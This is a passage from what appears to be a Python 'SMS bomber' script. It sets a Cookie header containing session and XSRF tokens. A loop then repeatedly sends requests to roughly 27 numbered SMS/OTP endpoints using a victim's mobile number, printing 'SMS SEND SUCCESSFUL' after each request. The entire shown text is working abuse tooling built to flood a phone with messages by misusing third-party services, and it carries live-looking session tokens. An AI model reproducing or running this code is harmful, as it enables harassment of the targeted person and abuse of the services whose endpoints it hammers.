headers27["Cookie"] = "_ga_H0CWDNCVZL=GS1.1.1695043332.1.1.1695043863.60.0.0; _ga=GA1.1.383783860.1695043333; XSRF-TOKEN=eyJpdiI6IkFLeFwvUmdVRUxhN1hXeEt1TWJ1MGtBPT0iLCJ2YWx1ZSI6IjZGcDVCRFlnSTVcL3ZEWGdaQWN5UXVhUTJwRkNRQ1d3UWFpVHVmZU0rc1YxMkJ0R1F4VmlmalpFbzd5ZXFPTUwwIiwibWFjIjoiYTE2NmQ0MjRjZjBlZjFhOWY0ZjEwM2U4MzMwYzVhNjk1Nzc1MWE2YzZlYWQ0NjZhOTFkYjg2NjJmNWU5YzMzMCJ9; daktarbhai_web_session=eyJpdiI6IkJIYTdNOEhXOE90OUxtUTNvcXpJNlE9PSIsInZhbHVlIjoiVEd0eUpCRWRQcnp6cE9aS0t1VERFbzcwejdsVkNRN0k0TnJTOGIxejdWck4zXC80KzQyNk5TRFYxWGRNQk04WFkiLCJtYWMiOiIyN2Y2N2ZhYThkMTkzNmZmNTIxMjkxYjA5ZGI4OWE2Mzg5YTI3YmM0ZjM4MGRjMjI3NWI4NmI3MjJkYWU5YzUyIn0%3D"

data27 = "mobile="+number

i = 0
while i <=amount:
    try:
        resp = requests.get(url1, headers=headers1)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url2, headers=headers2, data=data2)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url27, headers=headers27, data=data27)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url26, headers=headers26)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url5, headers=headers5)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url26, headers=headers26)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url6, headers=headers6, data=data6)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url27, headers=headers27, data=data27)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url24, headers=headers24, data=data24)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url12, headers=headers12, data=data12)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url26, headers=headers26)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url13, headers=headers13, data=data13)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url18)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url22, headers=headers22, data=data22)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url27, headers=headers27, data=data27)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url14, headers=headers14, data=data14)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url26, headers=headers26)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url3)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url21, data=data21,  headers=headers21)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url27, headers=headers27, data=data27)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url19, headers=headers19, data=data19)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url7, headers=headers7, data=data7)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url15, headers=headers15, data=data15)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url9, headers=headers9, data=data9)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url4, headers=headers4, data=data4)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url27, headers=headers27, data=data27)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url26, headers=headers26)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url16, headers=headers16)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url25, headers=headers25, data=data25)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url23, headers=headers23, data=data23)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url26, headers=headers26)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url20, headers=headers20, data=data20)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url10, headers=headers10, data=data10)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url11, headers=headers11, data=data11)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url17, headers=headers17)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.get(url26, headers=headers26)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1
        resp = requests.post(url27, headers=headers27, data=data27)
        print(str(i+1)+"  SMS SEND SUCCESSFUL\n")
        i += 1

    except:
         print("Sorry ! Network Problem ")    